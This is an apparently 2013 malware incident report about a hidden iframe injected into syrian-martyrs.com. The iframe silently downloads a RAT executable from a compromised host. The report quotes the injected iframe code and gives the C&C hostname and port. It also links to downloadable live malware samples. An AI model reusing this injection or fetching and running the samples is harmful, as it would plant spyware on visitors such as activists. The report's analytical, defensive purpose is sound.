[[!tag syria malware rat]]

**Warning**: if you try to access to _syrian-martyrs.com_, the website is infected and may **plant a malicious program on your machine without you knowing it**. This could lead an attacker to know every key you hit, gain access to your webcam, hard disk, etc. **This can be deadly dangerous**.

Since 28th January 2013, website _syrian-martyrs.com_ has been containing malicious HTML code that aims at downloading to the visitor's machine a Windows malware, which probably aims at spying on people's activity on their computer.

**Update** (2013-01-30 12:25 UTC): it seems the website has been cleaned up.

It is not (yet) listed on [syrianmalware.com](http://syrianmalware.com). It has the following characteristics:

    Filename: ActiveX.exe
    MD5 hash: 185c8d11c0611cae7c81f4458bf1adea
    SHA256 hash: cfdd3a78a895b3f49a39402eb28b0d2134cc3086849a41a6fdfe7d829a0d4dcd

A copy of it is available [here (**INFECTED LINK**)](https://resources.telecomix.ceops.eu/material/malwares/syrian-martyrs/ActiveX.exe).

I will try to update this page whenever new data on the matter comes up. Please feel free to [get in touch](https://id.ceops.eu/kheops/) with me if you see any inaccuracy in this page.

# Infection vector
Most pages on _syrian-martyrs.com_ contain malicious HTML code aiming at making the user download the executable file. The code is at the very end of pages' HTML code. The malicious code is the following:

    <p align="center">
    <iframe name="I1" width="10" height="10" src="http://acadcisco.unisla.pt/downloads/uploads/software/ActiveX.exe" border="0" frameborder="0">
    ?C ?I?? C???E??? C??? E?EII?? C???C?CE C?????E ?? E?E E???E? ?C??C? ?E? ?C ?I?? C???C?CE C?????E.
    </iframe></p>

With that iFrame, it asks the user's browser to download the file _ActiveX.exe_ hosted on _acadcisco.unisla.pt_. On some Windows browsers (Internet Explorer?), it might even execute the file automatically without warning.

It impacts (at least) all pages served by the _index.php_ script in the _/ar/_ directory, and the code always appear at the very bottom. This leads to think that the _index.php_ in that directory has been changed by an attacker to send that code after any dynamic content. It impacts the index file at the website's root as well.

Examples of infected URLs:

    http://www.syrian-martyrs.com/ar/index.php?option=com_content&view=article&id=15956:2013-01-28-17-04-23&catid=4:activest-martyrs&Itemid=2
    http://www.syrian-martyrs.com/

In short, **the website has probably been penetrated by an attacker who changed its content**. The attacker used either a Joomla vulnerability or another vulnerability on the server, which has many open ports. Admins should cleanup their website, identify how they have been infected and close vulnerabilities.

# Malware behavior

The malware is [detected by most anti-virus software](https://www.virustotal.com/file/cfdd3a78a895b3f49a39402eb28b0d2134cc3086849a41a6fdfe7d829a0d4dcd/analysis/1359494219/), and has apparently been known since Octobre 2010.

## Contact with an attacker's Command & Control server

This malware keeps trying to connect to host _awrasx10.no-ip.biz_ on TCP port 9999, which is probably the Command & Control from where it can either fetch another malware or receive orders on what to do to the victim's computer. This hostname at the moment resolved to 37.236.124.197, which is an Iraqi IP address for DSL broadband access:

    inetnum:        37.236.0.0 - 37.237.255.255
    netname:        BROADBAND-SUBSCRIBERS-POOL
    descr:          EarthLink Ltd. Communications&Internet Services-Orange
    country:        IQ

The C&C was down during previous tests, it was not possible yet to determine what data is exchanged. The C&C IP address has sporadically come up since then, but this did not allow to make further testings.

It should however be possible to analyse what the malware is sending by running it and spoofing the DNS reply for _awrasx10.no-ip.biz_.

## Detailed content of the malware executable file

The file contains other hidden/encrypted executables that are sequencially unpacked onto the victim's system. The final executable contains most of the malicious code. [y0ug](https://twitter.com/y0ug) gave [details on how the malware drops those new files on the system, and where the malicious code is located](https://resources.telecomix.ceops.eu/material/malwares/syrian-martyrs/2013-01-30_first_analysis.txt) by taking a look at strings that appear in the executable files.

The connection to the C&C does not seem to be inside the final unpacked file. Is the C&C supposed to have a role in the unpacking process?

The final unpacked file looks like a [Remote Administration Tool](https://en.wikipedia.org/wiki/Remote_Administration_Tool) (RAT), used to remotely observe activity on a computer, virtually giving the attacker full access to the victim's computer.

[Here](https://resources.telecomix.ceops.eu/material/malwares/syrian-martyrs/malware.zip) is a ZIP archive (password: _infected_) containing the initial file and two executable files created by it. The final malicious file is _XX.exe_, as [explained by y0ug](https://resources.telecomix.ceops.eu/material/malwares/syrian-martyrs/2013-01-30_first_analysis.txt).

_XX.exe_ is detected as _Spyrat_ by some anti-virus software. It contains, among others, strings like _Spy-Net_ (uncompress it with _upx -d XX.exe_ first). It also contains the string _Portions Copyright (c) 1999,2003 Avenger by NhT_, which leads to other posts related to malwares when [searching the web](https://seeks.hacktivist.me/search/txt/Avenger+by+NhT).

The final file may be one of the malwares written by the same author, while the file containing the C&C's hostname could have been specifically created by the person who packaged the malware and infected _syrian-martyrs.com_ with it.

# Who? Why?

The fact that _syrian-martyrs.com_ has been infected in particular can make us think that the action comes from pro-regime people aiming at targetting opponents. The fact that the C&C is based in Iraq can also be seen as a link with the Syrian situation.

It can also be the result of a non-targeted attack, i.e. someone performing automated scans of well-known vulnerability issues and subsequently infecting the website, in order to trap as many people as possible.

Another interrogation is why the malware is hosted on the Portuguese host _acadcisco.unisla.pt_, which appears to be a corporate website.
